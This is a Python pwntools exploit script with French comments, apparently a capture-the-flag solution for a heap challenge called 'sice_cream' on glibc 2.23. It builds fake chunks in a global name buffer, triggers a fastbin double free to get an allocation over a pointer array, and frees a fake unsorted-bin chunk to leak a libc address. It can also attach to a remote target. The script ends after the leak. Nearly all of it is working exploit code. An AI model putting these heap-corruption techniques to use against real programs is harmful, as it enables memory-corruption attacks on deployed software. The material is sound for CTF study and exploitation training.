import sys, time, re, struct
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'

BIN = './sice_cream'
LIBC = './libc.so.6'
NAME = 0x602040
CREAMS = 0x602140
FASTBIN_FAKE = 0x602130          # fake chunk -> user 0x602140 (creams)
UNSORTED_FAKE = 0x602050         # fake chunk pour le leak (size 0x91)

elf = ELF(BIN, checksec=False)
libc = ELF(LIBC, checksec=False)


def start(remote=False):
    if remote:
        host, port = open('./_z_55url.txt').read().split()
        return remote if False else tubes.remote(host, int(port))
    return process(['./ld-2.23.so', '--library-path', '.', BIN])


p = start(len(sys.argv) > 1 and sys.argv[1] == 'remote')
print(libc.symbols['__malloc_hook'], libc.symbols['__free_hook'])


def send_name(data):
    p.recvuntil(b'> ')
    p.send(data)


def menu():
    p.recvuntil(b'> ')


def buy(size, data):
    p.recvuntil(b'> ')          # menu prompt
    p.send(b'1\n')
    p.recvuntil(b'> ')          # size prompt
    p.send(str(size).encode() + b'\n')
    p.recvuntil(b'> ')          # flavor prompt
    p.send(data)
    p.recvuntil(b'Here you go!')


def eat(idx):
    p.recvuntil(b'> ')
    p.send(b'2\n')
    p.recvuntil(b'> ')
    p.send(str(idx).encode() + b'\n')
    p.recvuntil(b'Yum!')


def reintroduce(data):
    p.recvuntil(b'> ')
    p.send(b'3\n')
    p.recvuntil(b'> ')
    p.send(data)
    r = p.recvuntil(b'!', timeout=3)
    return r


# ---------- etape 1 : nom = faux chunks ----------
buf = bytearray(b'A' * 0x100)
# chunk non trie a 0x602050 : prev_size @+0x10, size @+0x18 = 0x91
buf[0x10:0x18] = b'A' * 8
buf[0x18:0x20] = p64(0x91)
# chunk suivant a 0x6020e0 : size 0x21
buf[0xa0:0xa8] = p64(0)
buf[0xa8:0xb0] = p64(0x21)
# chunk suivant-sn+1 a 0x602100 : size 0x21 (bit inuse)
buf[0xc0:0xc8] = p64(0)
buf[0xc8:0xd0] = p64(0x21)
# faux chunk fastbin a 0x602130 : size 0x60 -> user 0x602140
buf[0xf0:0xf8] = p64(0)
buf[0xf8:0x100] = p64(0x60)

p.recvuntil(b'Whats your name?')
send_name(bytes(buf))
print("nom envoye")

# ---------- etape 2 : fastbin dup -> allocation sur creams ----------
buy(0x58, b'A' * 0x58)     # 0
buy(0x58, b'B' * 0x58)     # 1
print("chunks alloues")
eat(0); eat(1); eat(0)
print("double free fait")
buy(0x58, p64(FASTBIN_FAKE) + b'C' * (0x58 - 8))
buy(0x58, b'D' * 0x58)
buy(0x58, b'E' * 0x58)
payload = p64(UNSORTED_FAKE) + p64(0) * 10
buy(0x58, payload)         # ecrit dans creams[0..10]
print("creams[0] = %#x" % UNSORTED_FAKE)

# ---------- etape 3 : free du faux chunk -> unsorted bin -> leak libc ----------
eat(0)
print("faux chunk libere")
leak_raw = reintroduce(b'B' * 16)
print("leak brut:", leak_raw)
m = re.search(rb'B{16}(.{0,8})', leak_raw, re.S)
if not m:
    print("!! leak non trouve")
    p.close()
    sys.exit(1)
raw = m.group(1)
fd = u64(raw[:6].ljust(8, b'\x00'))
print("fd = %#x" % fd)

# base libc via /proc si local
if 'remote' not in sys.argv:
    try:
        import glob
        maps = open('/proc/%d/maps' % p.pid).read()
        for ln in maps.split('\n'):
            if 'libc.so.6' in ln and 'r-xp' in ln:
                print(maps[:400])
                break
    except Exception as ex:
        print("maps:", ex)
p.close()
